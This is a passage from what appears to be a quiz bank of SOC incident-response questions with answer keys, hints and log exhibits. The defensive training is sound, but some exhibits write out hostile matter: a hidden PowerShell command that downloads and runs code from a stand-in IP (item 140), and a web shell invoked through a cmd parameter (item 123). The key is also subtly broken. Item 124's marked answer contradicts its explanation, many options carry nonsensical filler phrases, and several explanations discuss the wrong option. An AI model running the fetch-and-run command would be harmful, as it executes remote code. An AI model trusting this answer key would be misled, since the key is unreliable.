    options: ["Phishing attachment with signed binary proxy execution","SQL injection against the document management system","Password spraying against the mail gateway","Physical access to a workstation in the office"],
    correct: 0, why: "The macro drops a payload and abuses rundll32 for execution, matching phishing delivery and signed binary proxy execution.",
    hint: "Macro then rundll32."
  },
  {
    id: 118, rank: 2, role: "soc", topic: "Containing an Active Attacker", difficulty: "ADVANCED",
    q: "An attacker is actively moving through the network. What is the BEST containment approach?",
    options: ["Isolate each host as soon as it is found","Reboot every server in the data centre at midnight","Watch the attacker for a few weeks before acting, as soon as practical","Contain hosts and accounts together in one coordinated step"],
    correct: 3, why: "Isolating hosts one at a time is the runner-up since it limits local spread, but it alerts the attacker, who then adapts or escalates.",
    hint: "Act together."
  },
  {
    id: 119, rank: 2, role: "soc", topic: "Registry Run Key", difficulty: "ADVANCED",
    q: "Which registry entry is most suspicious?",
    options: ["HKLM Run: SecurityHealth = %windir%\\system32\\SecurityHealthSystray.exe","HKCU Run: WindowsUpdate = C:\\Users\\Public\\wu.exe","HKCU Run: Teams = C:\\Users\\a\\AppData\\Local\\Microsoft\\Teams\\Update.exe","HKLM Run: OneDrive = C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe"],
    correct: 1, why: "A fake updater name pointing to a public writable folder is typical of malware persistence.",
    hint: "Name versus path."
  },
  {
    id: 120, rank: 2, role: "soc", topic: "Sysmon Network Event", difficulty: "ADVANCED",
    q: "Sysmon event 3 shows winword.exe connecting to an external IP over port 4444. What is the best interpretation?",
    options: ["Word opening a template from a shared drive","Word syncing a document to a cloud share","Word installing an update","Likely reverse shell from exploited Word"],
    correct: 3, why: "Word has no reason to make outbound connections on port 4444, a common reverse shell port.",
    hint: "Odd process, odd port."
  },
  {
    id: 121, rank: 2, role: "soc", topic: "Authentication Log Source", difficulty: "ADVANCED",
    q: "Which log should be reviewed to see whether an attacker used a stolen Kerberos ticket from another host?",
    options: ["Web proxy logs sorted by website category","DHCP server logs showing recently leased addresses, as a general rule","Domain controller security logs for the account's ticket requests","Printer logs from the print server in the head office, in most cases"],
    correct: 2, why: "Ticket requests and logons for the account are logged on domain controllers.",
    hint: "Where tickets are issued."
  },
  {
    id: 122, rank: 2, role: "soc", topic: "Hunting Hypothesis", difficulty: "ADVANCED",
    q: "Which statement is a proper threat hunting hypothesis?",
    options: ["SIEM licences are expensive","We should look at all of the logs we have","Hunting is hard","Admin accounts are creating services remotely to move between servers"],
    correct: 3, why: "A hypothesis names an attacker behaviour and an observable that can be tested.",
    hint: "Behaviour plus observable."
  },
  {
    id: 123, rank: 2, role: "soc", topic: "Web Shell Upload Chain", difficulty: "ADVANCED",
    exhibit: "10:01:11 POST /upload.php 200\n10:01:13 GET /uploads/img_83.php 200\n10:01:20 GET /uploads/img_83.php?cmd=whoami 200",
    q: "Web logs show a POST to an upload endpoint, then a GET for the new file returning 200, then command parameters. What is the BEST first action?",
    options: ["Change the website theme, and redeploy the site","Isolate the server, preserve the web root and logs, and trace the upload source, as a first step","Block the user agent string seen in the requests","Delete the uploaded file at once"],
    correct: 1, why: "Deleting the file is the runner-up and stops execution, but it destroys evidence and leaves other implants and the entry method unknown.",
    hint: "Preserve first."
  },
  {
    id: 124, rank: 2, role: "soc", topic: "DNS over HTTPS Concern", difficulty: "ADVANCED",
    q: "How does DNS over HTTPS used by malware change detection?",
    options: ["It makes the malware completely undetectable","It only affects Linux servers","Queries leave resolver logs, so egress and TLS metadata matter, as a general rule","It speeds up the network for the users"],
    correct: 2, why: "DoH hides queries from internal resolver logs, so detection shifts to destinations and TLS characteristics.",
    hint: "Visibility moves."
  },
  {
    id: 125, rank: 2, role: "soc", topic: "Phishing Kit Infrastructure", difficulty: "ADVANCED",
    q: "Which action best disrupts a phishing campaign that uses a lookalike domain?",
    options: ["Send an awareness email only, and take no technical action","Block it, request takedown and find users who visited","Delete the SOC mailbox to stop further reports","Wait for the domain to expire after the registration year"],
    correct: 1, why: "Blocking, takedown and scoping affected users reduce current harm.",
    hint: "Block, takedown, scope."
  },
  {
    id: 126, rank: 2, role: "soc", topic: "Evidence Integrity", difficulty: "ADVANCED",
    q: "How should a disk image be verified after acquisition?",
    options: ["Compare hashes of the image and the source","Rename the image with the case number, in most cases","Open the image in a text editor, as soon as practical","Check that the file size looks about right, as a first step"],
    correct: 0, why: "Matching hashes show the copy is bit-for-bit identical and unchanged later.",
    hint: "Hash match."
  },
  {
    id: 127, rank: 2, role: "soc", topic: "Alert Tuning Metrics", difficulty: "ADVANCED",
    q: "Which metric best shows detection rule quality over time?",
    options: ["True positive rate together with analyst time per alert","The disk space used by the SIEM indexes, as a general rule","The total number of rules in the SIEM","The number of analysts on the rota"],
    correct: 0, why: "Quality needs precision and cost; counting rules or storage measures neither.",
    hint: "Precision and effort."
  },
  {
    id: 128, rank: 2, role: "soc", topic: "Mailbox Access Audit", difficulty: "ADVANCED",
    q: "Audit logs show mailbox items accessed by a delegate service account at night. What is the BEST first step?",
    options: ["Verify app consent, permissions and sign-in source","Switch off mailbox auditing to reduce noise","Block every service account in the tenant until morning","Ignore it, as service accounts are normal"],
    correct: 0, why: "Blocking all service accounts is the runner-up because it removes risk, but it causes outages; verifying consent and source is proportionate.",
    hint: "Verify, then act."
  },
  {
    id: 129, rank: 2, role: "soc", topic: "Lateral Movement via SMB", difficulty: "ADVANCED",
    q: "Which event combination best indicates PsExec-like lateral movement?",
    options: ["A scheduled report running under a reporting service account, as a general rule","A network printer connecting to the print server to fetch a job, as a general rule","A remotely created service with a random name after an admin share logon","A user mapping a department share, and opening a spreadsheet"],
    correct: 2, why: "Remote service creation through ADMIN$ with random names is a well known pattern.",
    hint: "Share then service."
  },
  {
    id: 130, rank: 2, role: "soc", topic: "Exfiltration via Cloud API", difficulty: "ADVANCED",
    q: "Which control best detects bulk copying of files to attacker-controlled cloud storage?",
    options: ["Proxy and CASB logs showing large uploads to unsanctioned tenants","Printer job logs from the print server","Spam filter logs from the mail gateway","Port scanning logs from the perimeter"],
    correct: 0, why: "Exfiltration to cloud services is visible in proxy and CASB data by volume and destination tenant.",
    hint: "Egress visibility."
  },
  {
    id: 131, rank: 2, role: "soc", topic: "Threat Actor Attribution", difficulty: "ADVANCED",
    q: "Why should analysts be cautious when attributing an intrusion to a named actor?",
    options: ["Attribution is prohibited by law in most countries","Actors always reuse the same infrastructure, and attribution is trivial","It makes incident response unnecessary for the victim","Tools and techniques are shared and can be faked"],
    correct: 3, why: "Overlapping tooling and false flags make weak attribution unreliable and distracting.",
    hint: "Evidence over names."
  },
  {
    id: 132, rank: 2, role: "soc", topic: "Incident Severity Reassessment", difficulty: "ADVANCED",
    q: "New evidence shows the compromised host held production database credentials. What should happen to the incident?",
    options: ["Keep severity the same","Close the incident","Raise severity, widen scope to the database and rotate the credentials, as a general rule","Rename the ticket"],
    correct: 2, why: "Credential exposure expands blast radius, so scope and priority must be updated.",
    hint: "Update scope."
  },
  {
    id: 133, rank: 2, role: "soc", topic: "YARA Rule Choice", difficulty: "ADVANCED",
    q: "Which YARA condition makes a rule more robust against simple repacking?",
    options: ["Matching only the file name of the sample","Matching a single hash of the first sample","Matching only the file size in bytes, in the first instance","Several unique strings plus structural traits"],
    correct: 3, why: "Combinations of unique content and structure survive minor changes better than single brittle attributes.",
    hint: "Several traits."
  },
  {
    id: 134, rank: 2, role: "soc", topic: "Container Escape Alert", difficulty: "ADVANCED",
    q: "A runtime alert shows a container mounting the host root filesystem and spawning a shell on the node. What is the BEST response?",
    options: ["Restart the container","Ignore it as containers are ephemeral","Isolate the node, preserve it and review credentials reachable from it, as a first step","Delete the pod only"],
    correct: 2, why: "Deleting the pod is the runner-up since it ends the process, but the host may be compromised and the workload will simply be rescheduled.",
    hint: "The node is the scope."
  },
  {
    id: 135, rank: 2, role: "soc", topic: "Log Tampering", difficulty: "ADVANCED",
    q: "Which event is the strongest sign an attacker tried to hide activity on a Windows host?",
    options: ["Event 4624 for a normal logon by a standard user, as a general rule","Event 6005 showing the event log service started","Event 1102: the security log was cleared by an unexpected account","Event 4634 for a logoff at the end of the day"],
    correct: 2, why: "Clearing the security log is rarely routine and is a standard anti-forensic action.",
    hint: "The log was cleared."
  },
  {
    id: 136, rank: 2, role: "soc", topic: "Beacon Jitter", difficulty: "ADVANCED",
    q: "What is the purpose of jitter in a malware beacon interval?",
    options: ["To compress traffic","To speed up the transfer of stolen files, as a general rule","To vary callback timing and avoid fixed-interval detection","To encrypt the payload"],
    correct: 2, why: "Randomised intervals make regular timing analysis less effective.",
    hint: "Hide the rhythm."
  },
  {
    id: 137, rank: 2, role: "soc", topic: "Incident Lessons Learned", difficulty: "ADVANCED",
    q: "What is the most valuable output of a post-incident review?",
    options: ["A longer incident ticket with every command listed","A new vendor purchase for the SOC","A list of names to blame for the incident","Owned actions that improve detection and response"],
    correct: 3, why: "Reviews should lead to tracked improvements with owners and dates.",
    hint: "Owned actions."
  },
  {
    id: 138, rank: 2, role: "soc", topic: "Service Account Misuse Hunt", difficulty: "ADVANCED",
    q: "Which query logic best finds service accounts being used interactively?",
    options: ["Failed logons for accounts that have never existed","Logoffs of normal users at the end of the day","All logons by administrators during office hours in the head office","Service account logons with interactive or remote types"],
    correct: 3, why: "Service accounts normally log on as services or batch; interactive use suggests misuse.",
    hint: "Wrong logon type."
  },
  {
    id: 139, rank: 2, role: "soc", topic: "Quarantine Versus Eradicate", difficulty: "ADVANCED",
    q: "What distinguishes eradication from containment in incident response?",
    options: ["Eradication removes attacker access and artefacts, containment only limits spread, as a general rule","Containment happens after recovery is complete","Eradication applies only to hardware replacement","They are the same step with two different names"],
    correct: 0, why: "Containment stops spread; eradication removes persistence and the root cause.",
    hint: "Limit, then remove."
  },
  {
    id: 140, rank: 2, role: "soc", topic: "WMI Persistence", difficulty: "ADVANCED",
    exhibit: "EventID 5861 Namespace: root\\subscription Consumer: CommandLineEventConsumer Name: Updater CommandLineTemplate: powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.9/p')",
    q: "Which finding best indicates WMI event subscription persistence?",
    options: ["A WMI repository rebuild performed by the helpdesk after a disk fault","A WMI query run by the inventory tool each night against every server","A WMI provider update installed by the vendor with the monthly patches","A new permanent consumer that runs PowerShell on a timer"],
    correct: 3, why: "Permanent event filter and consumer bindings that run commands are a stealthy persistence technique.",
    hint: "Filter, consumer, binding."
  },
  {
    id: 141, rank: 2, role: "soc", topic: "Lateral Movement Detection", difficulty: "ADVANCED",
    exhibit: "14:02:11 4624 type=3 src=WS-221 dst=SRV-APP01 user=svc-backup\n14:02:19 4624 type=3 src=WS-221 dst=SRV-DB02 user=svc-backup\n14:02:26 4624 type=3 src=WS-221 dst=SRV-FS03 user=svc-backup\n14:02:35 4624 type=3 src=WS-221 dst=DC01 user=svc-backup",
    q: "Which event sequence best indicates lateral movement?",
    options: ["One administrator logging in to a single server during the day, in most cases","A new remote login from a workstation to many servers in minutes","A server restarting after the monthly patch window, as a general rule","A user signing in to email from the office network"],
    correct: 1, why: "One host reaching many others in a short time with remote logons is typical of an intruder moving through the network.",
    hint: "One source, many targets."
  },
  {
    id: 142, rank: 2, role: "soc", topic: "Evidence Priority", difficulty: "ADVANCED",
    q: "Which evidence is BEST for an analyst to collect FIRST from a live compromised server?",
    options: ["Printed copies of the network diagram","Archived logs from last year in the backup system","The server manufacturer's specification sheet","Memory contents and running processes"],
    correct: 3, why: "Archived logs are the runner-up as they matter, but volatile data disappears on reboot and must be captured first.",
    hint: "Order of volatility."
  },
  {
    id: 143, rank: 2, role: "soc", topic: "Detection Coverage Gap", difficulty: "ADVANCED",
    q: "What is the best way to find gaps in detection coverage?",
    options: ["Ask each analyst which rule they like best","Map existing rules to attacker techniques and test them","Count how many alerts the SOC receives each day, and review the outcome at the next monthly meeting","Buy another tool, and assume it fills the gaps, wherever possible"],
    correct: 1, why: "Mapping and testing show which behaviours are and are not detected.",
    hint: "Map and test."
  },
  {
    id: 144, rank: 2, role: "soc", topic: "Alert Fatigue Cause", difficulty: "ADVANCED",
    q: "Which practice contributes most to analyst alert fatigue?",
    options: ["Clear escalation rules for different severities","Many low-value alerts with no tuning or context","A small number of high-confidence alerts with playbooks","Regular rotation of analysts between tasks"],
    correct: 1, why: "Noise hides real incidents and burns out analysts.",
    hint: "Noise."
  },
  {
    id: 145, rank: 2, role: "soc", topic: "Persistence Check", difficulty: "ADVANCED",
    exhibit: "Service: WinHelperSvc  Start: Auto  Account: LocalSystem\nImage: C:\\ProgramData\\wh\\svchost32.exe  Signed: no\nCreated: 2025-11-17 03:12  Created by: unknown\nSimilar services on other hosts: 0",
    q: "Which finding on a server is the strongest sign of persistence?",
    options: ["A user opening the standard system settings","The normal antivirus update task running at night, as a general rule","A scheduled patch installation by the update service, in most cases","A new service that runs an unknown binary at startup"],
    correct: 3, why: "Unknown services that start automatically let attackers return after a reboot.",
    hint: "Survives reboot."
  },
  {
    id: 146, rank: 2, role: "soc", topic: "Case Escalation Criteria", difficulty: "ADVANCED",
    q: "When should a Tier 1 analyst escalate an incident?",
    options: ["When it affects critical assets or shows signs of active compromise","Only at the end of the working week","Only when the user has called the helpdesk three times","Never as Tier 1 is expected to resolve every case"],
    correct: 0, why: "Escalation depends on impact and confidence not on user persistence.",
    hint: "Impact and confidence."
  },
  {
    id: 147, rank: 2, role: "soc", topic: "Proxy Log Interpretation", difficulty: "ADVANCED",
    exhibit: "10:47:02 10.4.8.41 POST https://files-share-x.example.org/up 200 bytes_out=1,842,331,904 category=uncategorised\n10:31:10 10.4.8.41 GET https://update.vendor.com/patch.cab 200 bytes_in=4,120,500 category=software",
    q: "What does this proxy log suggest?",
    options: ["A user downloading a normal software patch from a vendor, as a general rule","A workstation sending a large upload to an unknown external site","A scheduled antivirus signature update","A browser loading the company website for staff, as a general rule"],
    correct: 1, why: "A large outbound transfer to an unfamiliar site may indicate data theft.",
    hint: "Direction and size."
  },
  {
    id: 148, rank: 2, role: "soc", topic: "Containing Cloud Credentials", difficulty: "ADVANCED",
    q: "An access key was posted publicly. What is the best first action?",
    options: ["Change the name of the account that owns the key","Wait to see whether anyone uses the key","Delete the repository and take no other action","Disable the key and review its activity"],
    correct: 3, why: "A public key must be treated as compromised and revoked immediately.",
    hint: "Revoke first."
  },
  {
    id: 149, rank: 2, role: "soc", topic: "Playbook Automation Choice", difficulty: "ADVANCED",
    q: "Which task is the BEST candidate for automation in a phishing playbook?",
    options: ["Extracting links and checking them against reputation sources","Deciding whether to notify the company board of directors, then record the result in the ticket","Negotiating with the attacker about the stolen data, in most cases","Approving the dismissal of an employee who clicked, and revisit the decision after the next release"],
    correct: 0, why: "Notifying the board is the runner-up as it matters, but judgement tasks need people while enrichment is repetitive and safe to automate.",
    hint: "Repeatable and low risk."
  },
  {
    id: 150, rank: 2, role: "soc", topic: "Metrics for SOC Quality", difficulty: "ADVANCED",
    q: "Which metric best shows detection quality?",
    options: ["The share of alerts that are confirmed as real incidents","The total number of alerts received in the month","The number of analysts on shift each night","The number of dashboards on the wall"],
    correct: 0, why: "Precision tells you whether alerts are worth the analysts' time.",
    hint: "Precision."
  },
  {
    id: 151, rank: 3, role: "soc", topic: "Detection as Code", difficulty: "EXPERT",
    q: "A SOC edits SIEM rules directly in the console and cannot explain why rules changed. What is the best structural fix?",
    options: ["Export the rule list to a spreadsheet each month, and mark the changes by hand","Detection-as-code with peer review and automated tests","Freeze all rules for a year, and review them again only at the next audit","Give each analyst a personal copy of the rule set to edit in the console as they need"],
    correct: 1, why: "Versioned, reviewed and tested rules give an audit trail, safe rollback and repeatable quality.",
    hint: "Rules are software."
  },
  {
    id: 152, rank: 3, role: "soc", topic: "SIEM Versus Data Lake", difficulty: "EXPERT",
    q: "A SOC wants 13 months of enriched telemetry for hunting at a cost the SIEM licence cannot support. What is the BEST architecture?",
    options: ["Raise the SIEM licence until it covers all the data","Archive the logs to tape, and restore them only when an incident needs them","Tier data: alerts in the SIEM, full telemetry in a cheap lake","Cut retention to 30 days, and drop the hunting use case to stay inside the licence"],
    correct: 2, why: "Buying more SIEM capacity is the runner-up since it keeps one tool, but cost scales linearly; tiering keeps detection fast and hunting affordable.",
    hint: "Tier by use."
  },
  {
    id: 153, rank: 3, role: "soc", topic: "Telemetry Strategy", difficulty: "EXPERT",
    q: "Which approach best decides which log sources to onboard first for a new SOC?",
    options: ["Onboard whichever source is cheapest, and quickest to connect first","Onboard every device in alphabetical order, as a general rule","Map sources to the techniques that threaten the crown jewels","Wait for vendors to recommend sources, where that is practical"],
    correct: 2, why: "Threat- and asset-driven selection delivers detection value early instead of volume.",
    hint: "Threat-driven."
  },
  {
    id: 154, rank: 3, role: "soc", topic: "MDR Decision", difficulty: "EXPERT",
    q: "A mid-size company cannot staff a 24x7 SOC but must detect ransomware quickly. What is the BEST sourcing model?",
    options: ["A managed detection service with response authority and an owner","Recruit three analysts for a single shift and use email alerts overnight","Do nothing out of hours and review every alert the next morning at nine","Buy more tools, and expect them to contain every threat without staff"],
    correct: 0, why: "Single-shift staffing is the runner-up because it builds internal skills, but ransomware often starts out of hours; MDR with authority covers the gap.",
    hint: "Cover the hours."
  },
  {
    id: 155, rank: 3, role: "soc", topic: "Alert Quality Governance", difficulty: "EXPERT",
    q: "Which governance mechanism best keeps detection noise under control as rules grow?",
    options: ["A per-rule precision target with owner and review cycle","A monthly total of alerts displayed on the SOC wall screen","A rule that silences any alert after it fires ten times in a day","A requirement that analysts close alerts within five minutes"],
    correct: 0, why: "Owned precision targets drive tuning or retirement instead of hiding noise.",
    hint: "Own the quality."
  },
  {
    id: 156, rank: 3, role: "soc", topic: "SOAR Boundaries", difficulty: "EXPERT",
    q: "A SOAR platform can isolate endpoints, disable accounts and delete emails. What is the BEST way to design its autonomy?",
    options: ["Read-only enrichment only, with every response action done manually by analysts","Tiered autonomy by action risk, with approval for high impact, in most cases","Autonomy only for actions performed outside business hours when staff are away","Full autonomy for all actions to maximise speed"],
    correct: 1, why: "Read-only is the runner-up since it limits mistakes, but it wastes the speed advantage; tiered autonomy matches action risk.",
    hint: "Match autonomy to impact."
  },
  {
    id: 157, rank: 3, role: "soc", topic: "Threat Model for the SOC", difficulty: "EXPERT",
    q: "What should a threat model of the SOC itself include?",
    options: ["Only the physical security of the SOC room, and its door locks","The break room layout and seating plan for analysts","Attacks on the SIEM and on analyst accounts and rules","The brand of monitors used on the analysts' desks"],
    correct: 2, why: "The SOC is a high-value target; its tooling, privileged access and rules can be attacked or tampered with.",
    hint: "Protect the watchers."
  },
  {
    id: 158, rank: 3, role: "soc", topic: "Metrics That Drive Behaviour", difficulty: "EXPERT",
    q: "Which SOC metric set is least likely to encourage harmful behaviour?",
    options: ["Number of alerts closed per analyst per hour of each shift worked","Coverage, precision, time to contain and hunt-found incidents","Percentage of alerts closed without any analyst notes in the ticket","Number of tickets opened per day"],
    correct: 1, why: "Outcome metrics reward quality, while volume metrics push analysts to close quickly.",
    hint: "Outcomes over volume."
  },
  {
    id: 159, rank: 3, role: "soc", topic: "Cloud Logging Architecture", difficulty: "EXPERT",
    exhibit: "Provider   LogSource            Format      Retention\nAWS        CloudTrail           JSON        90d\nAzure      Activity/SignIn      JSON        30d\nGCP        Cloud Audit Logs     JSON        400d",
    q: "A company uses three cloud providers and wants consistent detection. What is the best design?",
    options: ["Use only the native consoles for each provider with no correlation, as soon as practical","Collect only network logs as they look the same in each cloud, in most cases","Central log collection with normalised fields and shared detection logic","Separate SOC teams with different tools in each cloud, and revisit the decision after the next release"],
    correct: 2, why: "Normalisation allows common detections and cross-cloud correlation.",
    hint: "One schema."
  },
  {
    id: 160, rank: 3, role: "soc", topic: "Insider Threat Programme", difficulty: "EXPERT",
    q: "Leadership wants to detect insider data theft. What is the BEST programme design?",
    options: ["Monitor every employee's personal messages all day","Rely on exit interviews alone to learn about data theft by leavers","Install keyloggers, and screen recorders on every endpoint in the company","Risk-based monitoring with agreed HR and legal oversight"],
    correct: 3, why: "Exit interviews are the runner-up since they are low cost and non-intrusive, but they reveal little; governed risk-based monitoring is effective and lawful.",
    hint: "Governed monitoring."
  },
  {
    id: 161, rank: 3, role: "soc", topic: "Deception Strategy", difficulty: "EXPERT",
    q: "How should canary tokens and decoy accounts be used in architecture?",
    options: ["Hide them from the SOC, and analysts are tested on their own initiative","Use them instead of endpoint detection","Place them where only intruders go, with high-priority alerts","Publish them on the company website where visitors, and partners can find them"],
    correct: 2, why: "Decoys give low-noise high-confidence detection of lateral movement and discovery.",
    hint: "Nothing legitimate touches them."
  },
  {
    id: 162, rank: 3, role: "soc", topic: "Retention and Privacy", difficulty: "EXPERT",
    q: "Security logs contain employee personal data. What is the BEST retention approach?",
    options: ["Let each system owner choose any retention period they prefer","Delete all logs after 24 hours to protect employee privacy completely","Keep all logs forever to be safe","Set retention per log type from need, and restrict access"],
    correct: 3, why: "Keeping everything forever is the runner-up because it preserves evidence, but it breaches minimisation and raises breach impact.",
    hint: "Purpose-based retention."
  },
  {
    id: 163, rank: 3, role: "soc", topic: "Purple Team Programme", difficulty: "EXPERT",
    q: "How should a mature SOC run purple teaming?",
    options: ["Only by the external vendor, with no involvement from the SOC analysts at all","Once every three years in the month before the external audit takes place each time","On a continuous cycle prioritised by threat intelligence","Only after a breach has happened"],
    correct: 2, why: "Continuous, prioritised testing keeps detections current as environments and attackers change.",
    hint: "Continuous and tracked."
  },
  {
    id: 164, rank: 3, role: "soc", topic: "Crisis Communication Design", difficulty: "EXPERT",
    q: "What should the incident communication plan define in advance?",
    options: ["A single shared email address used by every team during a crisis","The attacker's likely identity","The names, and phone numbers of the reporters who may call the press office","Roles, approved channels, templates and decision authority"],
    correct: 3, why: "Predefined roles and channels avoid delays and conflicting messages in a crisis.",
    hint: "Decide before the crisis."
  },
  {
    id: 165, rank: 3, role: "soc", topic: "OT Monitoring Design", difficulty: "EXPERT",
    q: "A SOC must monitor a plant network where agents cannot be installed. What is the BEST approach?",
    options: ["Scan the controllers actively every hour with a standard vulnerability scanner","Install agents on the controllers","Passive monitoring from span ports with protocol-aware sensors","Ignore the plant network, and watch only the IT side of the business"],
    correct: 2, why: "Active scanning is the runner-up since it finds assets quickly, but it can disrupt fragile devices; passive protocol-aware monitoring is safe.",
    hint: "Passive in OT."
  },
  {
    id: 166, rank: 3, role: "soc", topic: "Detection Backlog Prioritisation", difficulty: "EXPERT",
    q: "Which input should most influence the order of a detection engineering backlog?",
    options: ["Likelihood and impact of the technique against your environment","The analyst who requested it","The popularity of the rule on social media, and in vendor blog posts","The age of the ticket"],
    correct: 0, why: "Risk-based prioritisation spends effort where it reduces exposure the most.",
    hint: "Risk first."
  },
  {
    id: 167, rank: 3, role: "soc", topic: "Evidence for Legal Action", difficulty: "EXPERT",
    q: "A SOC expects possible court action after an intrusion. What should the architecture support?",
    options: ["Short retention periods to limit liability and storage cost","Analysts using personal tools","Immutable log storage and documented chain of custody","Unlogged access to evidence"],
    correct: 2, why: "Tamper-evident storage and handling records support admissibility.",
    hint: "Prove integrity."
  },
  {
    id: 168, rank: 3, role: "soc", topic: "Hunting Programme Structure", difficulty: "EXPERT",
    q: "How should a hunting team convert its findings into lasting value?",
    options: ["Repeat the same hunt every week by hand","Turn successful hunts into automated detections","Stop hunting whenever no incidents have been found by the team","Keep results private to the hunters"],
    correct: 1, why: "Operationalising hunts reduces future manual effort and raises baseline coverage.",
    hint: "Hunt, then automate."
  },
  {
    id: 169, rank: 3, role: "soc", topic: "Third-Party SOC Access", difficulty: "EXPERT",
    q: "An MSSP needs access to the company's SIEM and endpoints. What is the BEST control design?",
    options: ["Full domain admin rights for the provider to avoid delays in response","Named MFA accounts with least privilege and session logging","A shared MSSP admin account","Access only by email requests"],
    correct: 1, why: "A shared admin account is the runner-up because it is simple to set up, but it removes accountability and widens exposure.",
    hint: "Accountable access."
  },
  {
    id: 170, rank: 3, role: "soc", topic: "Telemetry Gap Analysis", difficulty: "EXPERT",
    exhibit: "Tabletop finding TT-14: PowerShell used for lateral movement.\nAvailable logs: process creation (4688) without command line, no 4104 script block events.",
    q: "A tabletop reveals the SOC cannot see PowerShell script content. What is the best remediation?",
    options: ["Ask the incident team to remember the commands, in most cases","Enable script block logging and forward it centrally","Rely on endpoint antivirus signatures, wherever possible","Block PowerShell for every user in the company, as a first step"],
    correct: 1, why: "The telemetry gap is closed by enabling and collecting script block logs, with testing of volume.",
    hint: "Fix the telemetry."
  },
  {
    id: 171, rank: 3, role: "soc", topic: "Case Management Design", difficulty: "EXPERT",
    q: "What is the main architectural benefit of integrating case management with detection and SOAR?",
    options: ["Tickets can be closed automatically without any analyst review at all","Logs no longer need to be stored","Fewer analysts are needed immediately","One linked record of alerts and actions for audit and tuning"],
    correct: 3, why: "Linked data supports reporting, quality review and rule improvement.",
    hint: "One record."
  },
  {
    id: 172, rank: 3, role: "soc", topic: "Purple Findings Triage", difficulty: "EXPERT",
    q: "A purple exercise shows 40 techniques undetected. What is the BEST response?",
    options: ["Accept the result as the attackers are advanced, and unstoppable","Ignore techniques that need admin rights","Rank by threat relevance, and fix the top items first","Fix all 40 before doing anything else"],
    correct: 2, why: "Fixing everything is the runner-up because it feels complete, but it delays the most relevant gaps; prioritisation delivers risk reduction sooner.",
    hint: "Prioritise."
  },
  {
    id: 173, rank: 3, role: "soc", topic: "SIEM Resilience", difficulty: "EXPERT",
    q: "What should a SIEM architecture include to remain useful during an attack on the network?",
    options: ["Out-of-band access and redundant collectors with protected storage","Logs stored on the monitored servers","A single collector in the data centre to keep the design simple, and cheap","Admin access only from the corporate network where the SIEM is hosted"],
    correct: 0, why: "Attackers target logging; resilient, separate infrastructure keeps visibility.",
    hint: "Survive the attack."
  },
  {
    id: 174, rank: 3, role: "soc", topic: "Identity-Centric Detection", difficulty: "EXPERT",
    q: "Which design choice best supports detection of compromised accounts?",
    options: ["Looking at VPN logs only","Reviewing the HR joiner, and leaver records once every month by hand","Counting only failed logons","Central identity logs enriched with endpoint and cloud events"],
    correct: 3, why: "Identity attacks cross systems, so correlation of identity, endpoint and cloud events is required.",
    hint: "Correlate identity."
  },
  {
    id: 175, rank: 3, role: "soc", topic: "Alert Routing", difficulty: "EXPERT",
    q: "How should alert routing handle different asset criticalities?",
    options: ["Route by asset criticality and data sensitivity with matching SLAs","Route randomly","Route all alerts to one shared inbox that the whole company can read daily","Route by alert vendor"],
    correct: 0, why: "Priority and response expectations should reflect business impact.",
    hint: "Business context."
  },
  {
    id: 176, rank: 3, role: "soc", topic: "Detection Testing Pipeline", difficulty: "EXPERT",
    q: "What belongs in a detection CI pipeline?",
    options: ["Syntax checks, replay tests and a benign-data false positive check","A requirement that rules have funny names, and analysts remember them","A weekly meeting about rules","Manual copy of rules to production"],
    correct: 0, why: "Automated tests protect rule quality before deployment.",
    hint: "Test automatically."
  },
  {
    id: 177, rank: 3, role: "soc", topic: "Backup Telemetry Source", difficulty: "EXPERT",
    q: "Endpoint logging was disabled by an attacker. Which design is the BEST way to preserve detection?",
    options: ["Restarting the agent more often, and it can send its logs again","Network, identity and cloud telemetry independent of the agent, in most cases","Hiding the agent names from users, and attackers cannot find it","Only trusting endpoint agents as they give the richest detail"],
    correct: 1, why: "Relying on endpoint agents alone is the runner-up as they give rich detail, but they are the first target; independent sources provide resilience.",
    hint: "Independent sources."
  },
  {
    id: 178, rank: 3, role: "soc", topic: "SOC Maturity Roadmap", difficulty: "EXPERT",
    q: "What should come first in a SOC maturity roadmap?",
    options: ["Buy the most advanced tool on the market before anything else, as a general rule","Rename the SOC, and review the outcome at the next monthly meeting","Hire a famous analyst from a well known competitor company, in the first instance","Define services and priority threats with measurable outcomes"],
    correct: 3, why: "A roadmap starts from objectives and risks, then selects capabilities.",
    hint: "Goals first."
  },
  {
    id: 179, rank: 3, role: "soc", topic: "Executive Reporting", difficulty: "EXPERT",
    q: "Which SOC report best helps the board oversee security operations?",
    options: ["Trend of risk-relevant incidents, detection coverage and response times against targets, in most cases","Raw log excerpts","A sample of analyst notes","A list of every alert from last month"],
    correct: 0, why: "Boards need outcomes and trends tied to risk, not operational detail.",
    hint: "Outcomes and trends."
  },
  {
    id: 180, rank: 3, role: "soc", topic: "Threat Intel Integration", difficulty: "EXPERT",
    q: "A threat intelligence team produces many reports. What is the BEST way for SOC detection to use them most effectively?",
    options: ["Use reports only in board slides","Add every indicator to the blocklist","Forward every report to analysts","Translate reports into prioritised detections, and hunts mapped to techniques, as a general rule"],
    correct: 3, why: "Adding all indicators is the runner-up since it acts quickly, but it creates noise and stale blocks; technique-based detections last longer.",
    hint: "Behaviours over IOCs."
  },
  {
    id: 181, rank: 3, role: "soc", topic: "Data Quality in SIEM", difficulty: "EXPERT",
    exhibit: "Source A: user=jdoe time=2026-03-02T10:00:00Z\nSource B: Username=JDOE time=03/02/26 10:00 AM\nSource C: account=jdoe@corp.example (no timestamp)",
    q: "Which problem most directly degrades detection quality across data sources?",
    options: ["Inconsistent field names and missing timestamps","The brand of server","Too many dashboards","Analyst shift lengths"],
    correct: 0, why: "Detections depend on consistent, parsed and correctly timed fields.",
    hint: "Parsing matters."
  },
  {
    id: 182, rank: 3, role: "soc", topic: "Containment Authority", difficulty: "EXPERT",
    q: "Analysts hesitate to isolate production servers because of business impact. What is the BEST structural fix?",
    options: ["Let analysts decide with no criteria","Require executive approval for every case","Pre-agreed containment authority with criteria and an on-call business approver","Never isolate production servers"],
    correct: 2, why: "Executive approval for every case is the runner-up as it protects the business, but it delays action; pre-agreed criteria combine speed and accountability.",
    hint: "Decide in advance."
  },
  {
    id: 183, rank: 3, role: "soc", topic: "Ransomware Resilience Design", difficulty: "EXPERT",
    q: "Which architecture best limits ransomware damage to detection and recovery?",
    options: ["Immutable offline backups, tested restores and early-warning detections on mass changes","Backups on the same network share","Relying on antivirus","One annual restore test"],
